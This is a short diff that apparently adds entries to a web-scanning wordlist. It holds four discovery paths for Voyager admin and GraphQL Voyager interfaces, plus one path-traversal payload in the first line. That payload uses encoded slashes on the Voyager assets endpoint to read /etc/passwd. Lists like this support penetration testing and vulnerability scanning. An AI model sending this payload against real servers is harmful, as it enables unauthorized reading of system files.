@@ -1,0 +1,5 @@
+/admin/voyager-assets?path=.....%2F%2F%2F.....%2F%2F%2F.....%2F%2F%2F.....%2F%2F%2F.....%2F%2F%2F.....%2F%2F%2F.....%2F%2F%2F.....%2F%2F%2F.....%2F%2F%2Fetc/passwd
+/voyager
+/voyager/
+/ui/voyager
+/graphql/voyager
